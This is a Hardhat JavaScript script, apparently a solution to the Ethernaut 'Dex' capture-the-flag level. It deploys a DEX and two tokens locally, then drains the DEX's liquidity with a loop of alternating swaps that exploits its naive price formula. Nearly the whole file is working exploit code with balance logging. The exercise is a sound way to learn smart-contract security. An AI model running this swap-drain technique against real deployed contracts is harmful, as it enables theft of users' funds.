const hre = require("hardhat");

async function main() {
  let owner;
  let attacker;
  [owner, attacker] = await ethers.getSigners();

  // Deployment
  const Dex = await hre.ethers.getContractFactory("Dex");
  const SwappableToken = await hre.ethers.getContractFactory("SwappableToken");

  const dex = await Dex.deploy();
  const swappableToken1 = await SwappableToken.connect(owner).deploy(dex.address, "ZigDex1", "ZD1", hre.ethers.utils.parseEther("110"));
  const swappableToken2 = await SwappableToken.connect(owner).deploy(dex.address, "ZigDex2", "ZD2", hre.ethers.utils.parseEther("110"));

  await dex.deployed();
  await swappableToken1.deployed();
  await swappableToken2.deployed();

  // Configuration
  await dex.connect(owner).setTokens(swappableToken1.address, swappableToken2.address);
  //// token1 liquidity
  await swappableToken1.connect(owner)["approve(address,address,uint256)"](owner.address, dex.address, hre.ethers.utils.parseEther("100"));
  await dex.connect(owner).addLiquidity(swappableToken1.address, hre.ethers.utils.parseEther("100"));
  //// token2 liquidity
  await swappableToken2.connect(owner)["approve(address,address,uint256)"](owner.address, dex.address, hre.ethers.utils.parseEther("100"));
  await dex.connect(owner).addLiquidity(swappableToken2.address, hre.ethers.utils.parseEther("100"));

  // attacker starts with 10 of each
  await swappableToken1.connect(owner).transfer(attacker.address, hre.ethers.utils.parseEther("10"));
  await swappableToken2.connect(owner).transfer(attacker.address, hre.ethers.utils.parseEther("10"));

  console.log("Attacker token 1 balance : ", await swappableToken1.balanceOf(attacker.address));

  // attack
  await swappableToken1.connect(attacker)["approve(address,address,uint256)"](attacker.address, dex.address, hre.ethers.utils.parseEther("200000"));
  await swappableToken2.connect(attacker)["approve(address,address,uint256)"](attacker.address, dex.address, hre.ethers.utils.parseEther("200000"));
  let keepGoing = 1;
  let coin = true;
  while (keepGoing == 1) {
    if (coin) {
      console.log("swap 1 to 2");
      if ((await swappableToken1.balanceOf(attacker.address)).lt(await swappableToken1.balanceOf(dex.address))) {
        console.log("case1");
        await dex.connect(attacker).swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(attacker.address));
      }
      else {
        console.log("case2");
        await dex.connect(attacker).swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(dex.address));
        keepGoing = 0;
      }
      
    }
    else {
      console.log("swap 2 to 1");
      if ((await swappableToken2.balanceOf(attacker.address)).lt(await swappableToken2.balanceOf(dex.address))) {
        console.log("case1");
        await dex.connect(attacker).swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(attacker.address));
      }
      else {
        console.log("case2");
        await dex.connect(attacker).swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(dex.address));
        keepGoing = 0;
      }

    }
    coin = !coin;
    console.log(coin);
    console.log("attacker token 1 balance : ", await swappableToken1.balanceOf(attacker.address));
    console.log("attacker token 2 balance : ", await swappableToken2.balanceOf(attacker.address));
    console.log("dex token 1 balance : ", await swappableToken1.balanceOf(dex.address));
    console.log("dex token 2 balance : ", await swappableToken2.balanceOf(dex.address));
  }
  /*
  await dex.connect(attacker).swap(swappableToken1.address, swappableToken2.address, hre.ethers.utils.parseEther("10"));
  await dex.connect(attacker).swap(swappableToken2.address, swappableToken1.address, hre.ethers.utils.parseEther("20"));
  console.log("attacker token 1 balance : ", await swappableToken1.balanceOf(attacker.address));
  console.log("attacker token 2 balance : ", await swappableToken2.balanceOf(attacker.address));
  console.log("dex token 1 balance : ", await swappableToken1.balanceOf(dex.address));
  console.log("dex token 2 balance : ", await swappableToken2.balanceOf(dex.address));
  await dex.connect(attacker).swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(attacker.address));
  await dex.connect(attacker).swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(attacker.address));
  console.log("attacker token 1 balance : ", await swappableToken1.balanceOf(attacker.address));
  console.log("attacker token 2 balance : ", await swappableToken2.balanceOf(attacker.address));
  console.log("dex token 1 balance : ", await swappableToken1.balanceOf(dex.address));
  console.log("dex token 2 balance : ", await swappableToken2.balanceOf(dex.address));
  await dex.connect(attacker).swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(attacker.address));
  await dex.connect(attacker).swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(dex.address));
  console.log("attacker token 1 balance : ", await swappableToken1.balanceOf(attacker.address));
  console.log("attacker token 2 balance : ", await swappableToken2.balanceOf(attacker.address));
  console.log("dex token 1 balance : ", await swappableToken1.balanceOf(dex.address));
  console.log("dex token 2 balance : ", await swappableToken2.balanceOf(dex.address));
  //await dex.connect(attacker).swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(attacker.address));
  //await dex.connect(attacker).swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(attacker.address));
  console.log("attacker token 1 balance : ", await swappableToken1.balanceOf(attacker.address));
  console.log("attacker token 2 balance : ", await swappableToken2.balanceOf(attacker.address));
  console.log("dex token 1 balance : ", await swappableToken1.balanceOf(dex.address));
  console.log("dex token 2 balance : ", await swappableToken2.balanceOf(dex.address));*/
  

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
